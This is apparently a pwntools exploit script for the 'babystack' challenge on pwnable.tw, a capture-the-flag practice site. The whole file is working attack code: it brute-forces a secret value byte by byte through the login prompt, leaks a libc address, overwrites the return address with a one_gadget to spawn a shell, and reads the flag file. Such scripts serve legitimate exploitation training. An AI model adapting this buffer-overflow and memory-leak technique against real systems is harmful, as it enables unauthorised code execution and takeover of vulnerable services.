from pwn import *
# conn=process("./babystack")
conn=remote("chall.pwnable.tw",10205)
libc=ELF("./bc.so.6")
elf=ELF("./babystack")

context.log_level="debug"

def signIn(passwd,flag=0):
	if flag==0:
		conn.sendlineafter(">> ","1"*16+passwd)
	elif flag == 1:
		conn.sendafter(">> ","1\x00")
		conn.sendafter("Your passowrd :",passwd)
	elif flag == 2:
		conn.sendafter(">> ","1")
		conn.sendafter("Your passowrd :",passwd+"\x00")

	data=conn.recvline()
	if "Failed !" in data:
		return False
	elif "Login Success !" in data:
		return True

def logOut():
	conn.sendafter(">> ","1")

def exit():
	conn.sendafter(">> ","2")

def magic_copy(payload):
	conn.sendafter(">> ","3")
	conn.sendafter("Copy :",payload)
	conn.recvuntil("It is magic copy !\n")


def leak_random_value(prefix,length,flag=0):
	s=prefix
	list=range(1,0x100)
	list.append(0)
	# list.remove(10)
	for i in range(length):
		for p in list:
			if signIn(s+chr(p),flag):
				s=s+chr(p)
				logOut()
				break

	return s[len(prefix):]

rand_num=leak_random_value("",16)
# elf_offset=u64(leak_random_value(rand_num+"1"*16,8))&0x00ffffffffffffff
# elf_base=elf_offset-0x1060

f={
	0x0:rand_num,
	0x10:"1\x00"+"1"*14,
	0x40:rand_num,
}

payload=fit(f,filler="a")
signIn(payload,flag=1)
magic_copy("a"*0x3f)
logOut()

# leak libc address
libc_base=u64("\x00"+leak_random_value(rand_num+"1",5,flag=2)+"\x00\x00")-0x3c4600

log.debug("libc address %s"%hex(libc_base))
# log.debug("elf address %s"%hex(elf_base))


f={
	0x0:rand_num+"\x00",
	0x40:rand_num,
	0x60:p64(0xffffffffffffffff),
	0x68:p64(libc_base+0x45216),# one_gadget
}
signIn(fit(f,filler="a"))
magic_copy("a"*0x3f)
exit()
conn.sendline("cat /home/*/flag")


